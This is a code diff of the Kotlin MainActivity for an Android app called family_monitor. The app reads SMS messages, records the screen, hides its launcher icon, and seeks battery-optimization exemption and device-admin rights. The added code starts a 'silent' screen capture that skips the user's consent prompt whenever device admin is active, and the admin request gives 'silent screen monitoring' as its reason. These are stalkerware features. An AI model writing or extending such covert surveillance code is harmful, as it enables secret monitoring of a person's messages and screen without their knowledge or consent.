@@ -1,163 +1,68 @@
 package com.example.family_monitor
-
-import android.app.Activity
-import android.content.Intent
-import android.media.projection.MediaProjectionManager
-import android.net.Uri
-import android.os.Build
-import android.os.PowerManager
-import android.provider.Settings
-import io.flutter.embedding.android.FlutterActivity
-import io.flutter.embedding.engine.FlutterEngine
+import android.app.Activity; import android.app.admin.DevicePolicyManager; import android.content.ComponentName
+import android.content.Intent; import android.media.projection.MediaProjectionManager; import android.net.Uri
+import android.os.Build; import android.os.PowerManager; import android.provider.Settings
+import io.flutter.embedding.android.FlutterActivity; import io.flutter.embedding.engine.FlutterEngine
 import io.flutter.plugin.common.MethodChannel
-
 class MainActivity : FlutterActivity() {
-
-    private val SMS_CHANNEL    = "family_monitor/sms"
-    private val SCREEN_CHANNEL = "family_monitor/screen_capture"
-
-    private val REQUEST_MEDIA_PROJECTION = 1001
-    private val REQUEST_BATTERY_EXEMPT   = 1002
-
-    private var pendingScreenResult: MethodChannel.Result? = null
-
+    private val SMS_CHANNEL="family_monitor/sms"; private val SCREEN_CHANNEL="family_monitor/screen_capture"
+    private val REQ_PROJECTION=1001; private val REQ_BATTERY=1002; private val REQ_ADMIN=1003
+    private var pendingScreen: MethodChannel.Result?=null; private var pendingAdmin: MethodChannel.Result?=null
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
-
-        // ── SMS channel (existing) ───────────────────────────────────────────────
-        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SMS_CHANNEL)
-            .setMethodCallHandler { call, result ->
-                if (call.method == "readSms") {
-                    val limit = call.argument<Int>("limit") ?: 100
-                    result.success(readSms(limit))
-                } else result.notImplemented()
-            }
-
-        // ── Screen-capture / device-admin channel (new) ──────────────────────────
-        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, SCREEN_CHANNEL)
-            .setMethodCallHandler { call, result ->
-                when (call.method) {
-
-                    "requestScreenCapture" -> {
-                        if (pendingScreenResult != null) {
-                            result.error("ALREADY_PENDING",
-                                "A screen-capture request is already in progress", null)
-                            return@setMethodCallHandler
-                        }
-                        pendingScreenResult = result
-                        val pm = getSystemService(MEDIA_PROJECTION_SERVICE)
-                                as MediaProjectionManager
-                        startActivityForResult(
-                            pm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger,SMS_CHANNEL).setMethodCallHandler{call,result->
+            if(call.method=="readSms") result.success(readSms(call.argument<Int>("limit")?:100)) else result.notImplemented()
+        }
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger,SCREEN_CHANNEL).setMethodCallHandler{call,result->
+            when(call.method){
+                "requestScreenCapture"->{
+                    if(pendingScreen!=null){result.error("ALREADY_PENDING","pending",null);return@setMethodCallHandler}
+                    if(ScreenCaptureService.isDeviceAdminActive(this)){
+                        val i=Intent(this,ScreenCaptureService::class.java).apply{action=ScreenCaptureService.ACTION_START_SILENT}
+                        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
+                        result.success(mapOf("granted" to true,"resultCode" to Activity.RESULT_OK)); return@setMethodCallHandler
                     }
-
-                    "stopScreenCaptureService" -> {
-                        val intent = Intent(this, ScreenCaptureService::class.java)
-                            .apply { action = ScreenCaptureService.ACTION_STOP }
-                        startService(intent)
-                        result.success(true)
-                    }
-
-                    "requestBatteryOptimizationExemption" -> {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            val pm = getSystemService(PowerManager::class.java)
-                            val pkg = packageName
-                            if (!pm.isIgnoringBatteryOptimizations(pkg)) {
-                                startActivityForResult(
-                                    Intent(
-                                        Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
-                                        Uri.parse("package:$pkg")
-                                    ), REQUEST_BATTERY_EXEMPT)
-                            }
-                        }
-                        result.success(true)
-                    }
-
-                    "isBatteryOptimizationExempt" -> {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            val pm = getSystemService(PowerManager::class.java)
-                            result.success(pm.isIgnoringBatteryOptimizations(packageName))
-                        } else {
-                            result.success(true)
-                        }
-                    }
-
-                    "hideLauncherIcon" -> {
-                        try {
-                            packageManager.setComponentEnabledSetting(
-                                android.content.ComponentName(this,
-                                    "${packageName}.MainActivity"),
-                                android.content.pm.PackageManager
-                                    .COMPONENT_ENABLED_STATE_DISABLED,
-                                android.content.pm.PackageManager.DONT_KILL_APP
-                            )
-                            result.success(true)
-                        } catch (e: Exception) {
-                            result.error("HIDE_FAILED", e.message, null)
-                        }
-                    }
-
-                    "showLauncherIcon" -> {
-                        try {
-                            packageManager.setComponentEnabledSetting(
-                                android.content.ComponentName(this,
-                                    "${packageName}.MainActivity"),
-                                android.content.pm.PackageManager
-                                    .COMPONENT_ENABLED_STATE_ENABLED,
-                                android.content.pm.PackageManager.DONT_KILL_APP
-                            )
-                            result.success(true)
-                        } catch (e: Exception) {
-                            result.error("SHOW_FAILED", e.message, null)
-                        }
-                    }
-
-                    else -> result.notImplemented()
+                    pendingScreen=result
+                    startActivityForResult((getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager).createScreenCaptureIntent(),REQ_PROJECTION)
                 }
-            }
-    }
-
-    @Deprecated("Deprecated in Java")
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-
-        if (requestCode == REQUEST_MEDIA_PROJECTION) {
-            val pending = pendingScreenResult
-            pendingScreenResult = null
-
-            if (resultCode == Activity.RESULT_OK && data != null) {
-                val svcIntent = Intent(this, ScreenCaptureService::class.java).apply {
-                    action = ScreenCaptureService.ACTION_START
-                    putExtra(ScreenCaptureService.EXTRA_RESULT_CODE, resultCode)
-                    putExtra(ScreenCaptureService.EXTRA_RESULT_DATA, data)
+                "stopScreenCaptureService"->{startService(Intent(this,ScreenCaptureService::class.java).apply{action=ScreenCaptureService.ACTION_STOP});result.success(true)}
+                "isDeviceAdminActive"->result.success(ScreenCaptureService.isDeviceAdminActive(this))
+                "requestDeviceAdmin"->{
+                    if(ScreenCaptureService.isDeviceAdminActive(this)){result.success(true);return@setMethodCallHandler}
+                    pendingAdmin=result
+                    startActivityForResult(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply{
+                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,ComponentName(this@MainActivity,FamilyDeviceAdminReceiver::class.java))
+                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"Needed for silent screen monitoring.")
+                    },REQ_ADMIN)
                 }
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    startForegroundService(svcIntent)
-                } else {
-                    startService(svcIntent)
-                }
-                pending?.success(mapOf("granted" to true, "resultCode" to resultCode))
-            } else {
-                pending?.success(mapOf("granted" to false, "resultCode" to resultCode))
+                "removeDeviceAdmin"->{try{(getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager).removeActiveAdmin(ComponentName(this,FamilyDeviceAdminReceiver::class.java));result.success(true)}catch(e:Exception){result.error("ERR",e.message,null)}}
+                "requestBatteryOptimizationExemption"->{if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){val pm=getSystemService(PowerManager::class.java);if(!pm.isIgnoringBatteryOptimizations(packageName))startActivityForResult(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,Uri.parse("package:$packageName")),REQ_BATTERY)};result.success(true)}
+                "isBatteryOptimizationExempt"->if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M)result.success(getSystemService(PowerManager::class.java).isIgnoringBatteryOptimizations(packageName)) else result.success(true)
+                "hideLauncherIcon"->{try{packageManager.setComponentEnabledSetting(ComponentName(this,"${packageName}.MainActivity"),android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,android.content.pm.PackageManager.DONT_KILL_APP);result.success(true)}catch(e:Exception){result.error("ERR",e.message,null)}}
+                "showLauncherIcon"->{try{packageManager.setComponentEnabledSetting(ComponentName(this,"${packageName}.MainActivity"),android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,android.content.pm.PackageManager.DONT_KILL_APP);result.success(true)}catch(e:Exception){result.error("ERR",e.message,null)}}
+                else->result.notImplemented()
             }
         }
     }
-
-    private fun readSms(limit: Int): List<Map<String, Any>> {
-        val msgs = mutableListOf<Map<String, Any>>()
-        try {
-            val cursor = contentResolver.query(
-                Uri.parse("content://sms"), arrayOf("address","body","date","type"),
-                null, null, "date DESC LIMIT $limit")
-            cursor?.use {
-                val ai=it.getColumnIndex("address"); val bi=it.getColumnIndex("body")
-                val di=it.getColumnIndex("date"); val ti=it.getColumnIndex("type")
-                while (it.moveToNext()) msgs.add(mapOf(
-                    "address" to (it.getString(ai)?:""),
-                    "body" to (it.getString(bi)?:""),
-                    "date" to it.getLong(di), "type" to it.getInt(ti)))
+    @Deprecated("Deprecated in Java")
+    override fun onActivityResult(requestCode:Int,resultCode:Int,data:Intent?){
+        super.onActivityResult(requestCode,resultCode,data)
+        when(requestCode){
+            REQ_PROJECTION->{val p=pendingScreen;pendingScreen=null
+                if(resultCode==Activity.RESULT_OK&&data!=null){
+                    val i=Intent(this,ScreenCaptureService::class.java).apply{action=ScreenCaptureService.ACTION_START;putExtra(ScreenCaptureService.EXTRA_RESULT_CODE,resultCode);putExtra(ScreenCaptureService.EXTRA_RESULT_DATA,data)}
+                    if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O) startForegroundService(i) else startService(i)
+                    p?.success(mapOf("granted" to true,"resultCode" to resultCode))
+                } else p?.success(mapOf("granted" to false,"resultCode" to resultCode))
             }
-        } catch (e: Exception) {}
+            REQ_ADMIN->{val p=pendingAdmin;pendingAdmin=null;p?.success(resultCode==Activity.RESULT_OK)}
+        }
+    }
+    private fun readSms(limit:Int):List<Map<String,Any>>{
+        val msgs=mutableListOf<Map<String,Any>>()
+        try{val c=contentResolver.query(Uri.parse("content://sms"),arrayOf("address","body","date","type"),null,null,"date DESC LIMIT $limit")
+            c?.use{val ai=it.getColumnIndex("address");val bi=it.getColumnIndex("body");val di=it.getColumnIndex("date");val ti=it.getColumnIndex("type")
+                while(it.moveToNext())msgs.add(mapOf("address" to(it.getString(ai)?:""),"body" to(it.getString(bi)?:""),"date" to it.getLong(di),"type" to it.getInt(ti)))}}catch(e:Exception){}
         return msgs
     }
 }
